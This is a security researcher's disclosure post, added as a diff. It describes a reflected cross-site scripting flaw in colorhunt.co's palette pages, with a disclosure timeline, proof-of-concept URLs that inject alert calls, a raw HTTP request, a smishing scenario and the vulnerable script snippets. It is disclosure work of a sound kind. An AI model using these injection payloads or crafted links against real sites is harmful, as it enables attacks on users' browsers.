@@ -1,0 +1,190 @@
+I"N><p>In this post, I’ll describe a DOM based reflective cross-site scripting vulnerability I disclosed to colorhunt.co back on June 5th. While the application owner was appreciative of the disclosure, they stated they were already aware of the vulnerability and had no plans to mitigate the risks. I offered to wait for public disclosure until a patch had been issued, and provided several mitigation strategies which could reduce the impact of the vulnerability, ultimately publishing this disclosure in late August.</p>
+
+<h4 id="index"><strong>Index</strong></h4>
+<ul>
+  <li><a href="/blog/2021/08/colorhunt-xss#-disclosure-timeline">Disclosure Timeline</a></li>
+  <li><a href="/blog/2021/08/colorhunt-xss#executive-summary">Executive Summary</a></li>
+  <li><a href="/blog/2021/08/colorhunt-xss#proof-of-concept">Proof of Concept</a></li>
+</ul>
+
+<h4 id="-disclosure-timeline"><strong>⏱ Disclosure Timeline</strong></h4>
+
+<div class="timeline mt-1 mb-1">
+      <div class="tl-item active">
+          <div class="tl-dot b-warning"></div>
+          <div class="tl-content">
+              <div class="">I attempt to find a security contact at colorhunt.co, could not do so, and contacted team@colorhunt.co and product developer hello@galshir.com</div>
+              <div class="tl-date text-muted mt-1">5 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-warning"></div>
+          <div class="tl-content">
+              <div class="">I recieve response hello@galshir.com requesting the disclosure details</div>
+              <div class="tl-date text-muted mt-1">5 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-primary"></div>
+          <div class="tl-content">
+              <div class="">I provide a complete <a href="/assets/pdf/colorhunt_xss_disclosure.pdf" class="highlighted">disclosure report</a></div>
+              <div class="tl-date text-muted mt-1">6 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-primary"></div>
+          <div class="tl-content">
+              <div class="">Colorhunt product developer states they were aware of the vulnerability</div>
+              <div class="tl-date text-muted mt-1">7 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-primary"></div>
+          <div class="tl-content">
+              <div class="">I state I'll will wait for public disclsure until fix is live</div>
+              <div class="tl-date text-muted mt-1">9 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-danger"></div>
+          <div class="tl-content">
+              <div class="">I do not recieve a response from previous email, and email again stating my desire to publish early July or wait longer if a patch will be published</div>
+              <div class="tl-date text-muted mt-1">30 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-danger"></div>
+          <div class="tl-content">
+              <div class="">I do not hear back from product developer and publish the disclosure</div>
+              <div class="tl-date text-muted mt-1">25 Aug 2021</div>
+          </div>
+      </div>
+    </div>
+
+<h3 id="executive-summary"><strong>Executive Summary</strong></h3>
+<p>On June 5th, I discovered a reflected cross-site (xss) scripting vulnerability in colorhunt.co via the pallet type selection. Malicious users can inject arbitrary javascript directly into two script elements by appending a crafted payload to the end of the pallet name in the resource <code class="language-plaintext highlighter-rouge">/palettes/[term]</code>. This vulnerability can be used to spread malicious links that execute client-side code in victim browsers. It is recommended that colorhunt triage this vulnerability as soon as possible, and implement validation and sanitization measures.</p>
+
+<h3 id="proof-of-concept"><strong>Proof of Concept</strong>:</h3>
+<p>To demonstrate the vulnerability, I created a few proof of concept exploits. Notice that any payload will execute if placed after <code class="language-plaintext highlighter-rouge">/pallets/</code>, and the use of pallet terms like ‘trendy’ is not necessary. Performing a GET request with the following urls will result in an alert box executing.</p>
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><a href="https://colorhunt.co/palettes/trendy%22;alert('xss');var%20foo%20=%20%22foo">https://colorhunt.co/palettes/trendy%22;alert(‘xss’);var%20foo%20=%20%22foo</a></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><a href="https://colorhunt.co/palettes/popular%22;alert('xss');var%20foo%20=%20%22foo">https://colorhunt.co/palettes/popular%22;alert(‘xss’);var%20foo%20=%20%22foo</a></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><a href="https://colorhunt.co/palettes/random%22;alert('xss');var%20foo%20=%20%22foo">https://colorhunt.co/palettes/random%22;alert(‘xss’);var%20foo%20=%20%22foo</a></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><a href="https://colorhunt.co/palettes/%22;alert('xss');var%20foo%20=%20%22foo">https://colorhunt.co/palettes/%22;alert(‘xss’);var%20foo%20=%20%22foo</a></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><a href="https://colorhunt.co/palettes/idontexist%22;alert('xss');var%20foo%20=%20%22foo">https://colorhunt.co/palettes/idontexist%22;alert(‘xss’);var%20foo%20=%20%22foo</a></li>
+</ul>
+
+<p><strong>Payload</strong>:  <code class="language-plaintext highlighter-rouge">trendy%22;alert('xss');var%20foo%20=%20%22foo</code></p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">GET /palettes/trendy%22;alert('xss');var%20foo%20=%20%22foo HTTP/2</span>
+<span class="na">Host</span><span class="pi">:</span> <span class="s">colorhunt.co</span>
+<span class="na">Cookie</span><span class="pi">:</span> <span class="s">_ga=GA1.2.899449749.1622947948; _gid=GA1.2.309200134.1622947949; __gads=ID=e1e1623e28567740-22296d5a887a004b:T=1622947948:RT=1622947948:S=ALNI_MayH-wZSN2DBrZpy709ubLpdffneA</span>
+<span class="na">Cache-Control</span><span class="pi">:</span> <span class="s">max-age=0</span>
+<span class="na">Sec-Ch-Ua</span><span class="pi">:</span> <span class="s2">"</span><span class="nv"> </span><span class="s">Not</span><span class="nv"> </span><span class="s">A;Brand";v="99", "Chromium";v="90"</span>
+<span class="na">Sec-Ch-Ua-Mobile</span><span class="pi">:</span> <span class="s">?0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="pi">:</span> <span class="m">1</span>
+<span class="na">User-Agent</span><span class="pi">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span>
+<span class="na">Accept</span><span class="pi">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Sec-Fetch-Site</span><span class="pi">:</span> <span class="s">none</span>
+<span class="na">Sec-Fetch-Mode</span><span class="pi">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-User</span><span class="pi">:</span> <span class="s">?1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="pi">:</span> <span class="s">document</span>
+<span class="na">Accept-Encoding</span><span class="pi">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="pi">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Connection</span><span class="pi">:</span> <span class="s">close</span>
+</code></pre></div></div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/xss.png" />
+    </div>
+</div>
+
+<h2 id="exploitability">Exploitability</h2>
+<p>Below is a quick sample scenario that shows how this vulnerability can be exploited</p>
+
+<blockquote>
+  <p><em>Attacker sends targeted smishing message to victim</em></p>
+</blockquote>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/scenario_part1.png" />
+    </div>
+</div>
+
+<blockquote>
+  <p><em>Vitim recieves message and opens link</em></p>
+</blockquote>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/scenario_part2.png" />
+    </div>
+</div>
+
+<blockquote>
+  <p><em>Payload executes in vicitm browser</em></p>
+</blockquote>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/scenario_part3.png" />
+    </div>
+</div>
+
+<h3 id="vulnerable-components"><strong>Vulnerable Components</strong></h3>
+
+<p>I’ve identified the following component as the root cause of the reflected XSS vulnerability.</p>
+
+<h4 id="vulnerable-component-1">Vulnerable Component 1</h4>
+
+<p>The script element near line 193 of <code class="language-plaintext highlighter-rouge">https://colorhunt.co/palettes/trendy</code> takes the pallet type name ( in this case “trendy”) and injects it into the <code class="language-plaintext highlighter-rouge">tags</code> variable. To exploit this, the payload above closes the tags variable, injects an arbitrary javascript function (in the below example, to log to the console), and then declares a new variable to close out the payload.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span> <span class="nx">tags</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">trendy</span><span class="dl">"</span><span class="p">;</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo</span><span class="dl">'</span><span class="p">);</span><span class="kd">var</span> <span class="nx">foo</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">foo</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">sort</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">new</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#sort_menu new</span><span class="dl">'</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">"</span><span class="s2">selected</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="nx">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nx">step</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nx">oktoload</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">yes</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">().</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">firefox</span><span class="dl">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+  <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#likes .list</span><span class="dl">'</span><span class="p">).</span><span class="nx">css</span><span class="p">(</span><span class="dl">'</span><span class="s1">overflow</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">hidden</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">taker</span><span class="p">(</span><span class="nx">step</span><span class="p">,</span><span class="nx">sort</span><span class="p">,</span><span class="nx">tags</span><span class="p">);</span>
+  <span class="nx">list_likes</span><span class="p">();</span>
+  <span class="nx">select_sort_button</span><span class="p">(</span><span class="nx">sort</span><span class="p">);</span>
+  <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">like_first_palette_tip</span><span class="p">();</span> <span class="p">},</span> <span class="mi">1500</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/vulnerable-component-1.png" />
+    </div>
+</div>
+
+<h4 id="vulnerable-component-2">Vulnerable Component 2:</h4>
+
+<p>The script element near line 222 of <code class="language-plaintext highlighter-rouge">https://colorhunt.co/palettes/trendy</code> takes the pallet type name ( in this case “trendy”) and injects it into the <code class="language-plaintext highlighter-rouge">current</code> variable. To exploit this, the payload above closes the tags variable, injects an arbitrary javascript function (in the below example, to log to the console), and then declares a new variable to close out the payload.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
+
+<span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">current</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">palettes</span><span class="dl">"</span><span class="p">;</span>
+  <span class="nx">tags</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">trendy</span><span class="dl">"</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">abc123</span><span class="dl">'</span><span class="p">);</span><span class="kd">var</span> <span class="nx">foo</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">foo</span><span class="dl">"</span><span class="p">;</span>
+  <span class="nx">select_menu_button</span><span class="p">(</span><span class="nx">current</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/vulnerable-component-2.png" />
+    </div>
+</div>
+:ET
